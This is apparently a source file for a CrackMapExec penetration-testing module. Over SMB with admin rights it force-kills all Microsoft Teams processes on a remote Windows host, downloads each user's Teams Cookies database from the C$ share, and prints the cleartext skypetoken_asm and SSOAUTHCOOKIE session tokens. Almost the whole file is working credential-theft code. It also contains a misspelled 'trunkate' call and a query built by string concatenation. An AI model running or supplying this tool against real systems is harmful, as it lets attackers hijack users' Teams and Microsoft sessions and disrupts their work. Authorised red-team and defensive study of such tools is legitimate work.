#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sqlite3


class CMEModule:
    name = "teams_localdb"
    description = "Retrieves the cleartext ssoauthcookie from the local Microsoft Teams database, if teams is open we kill all Teams process"
    supported_protocols = ["smb"]
    opsec_safe = True
    multiple_hosts = False

    def options(self, context, module_options):
        """ """

    def on_admin_login(self, context, connection):
        context.log.display("Killing all Teams process to open the cookie file")
        connection.execute("taskkill /F /T /IM teams.exe")
        # sleep(3)
        found = 0
        paths = connection.spider("C$", folder="Users", regex=["[a-zA-Z0-9]*"], depth=0)
        with open("/tmp/teams_cookies2.txt", "wb") as f:
            for path in paths:
                try:
                    connection.conn.getFile("C$", path + "/AppData/Roaming/Microsoft/Teams/Cookies", f.write)
                    context.log.highlight("Found Cookie file in path " + path)
                    found = 1
                    self.parse_file(context, "skypetoken_asm")
                    self.parse_file(context, "SSOAUTHCOOKIE")
                    f.seek(0)
                    f.trunkate()
                except Exception as e:
                    if "STATUS_SHARING_VIOLATION" in str(e):
                        context.log.debug(str(e))
                        context.log.highlight("Found Cookie file in path " + path)
                        context.log.fail("Cannot retrieve file, most likely Teams is running which prevents us from retrieving the Cookies database")
        if found == 0:
            context.log.display("No cookie file found in Users folder")

    @staticmethod
    def parse_file(context, name):
        try:
            conn = sqlite3.connect("/tmp/teams_cookies2.txt")
            c = conn.cursor()
            c.execute("SELECT value FROM cookies WHERE name = '" + name + "'")
            row = c.fetchone()
            if row is None:
                context.log.fail("No " + name + " present in Microsoft Teams Cookies database")
            else:
                context.log.success("Succesfully extracted " + name + ": ")
                context.log.success(row[0])
            conn.close()
        except Exception as e:
            context.log.fail(str(e))
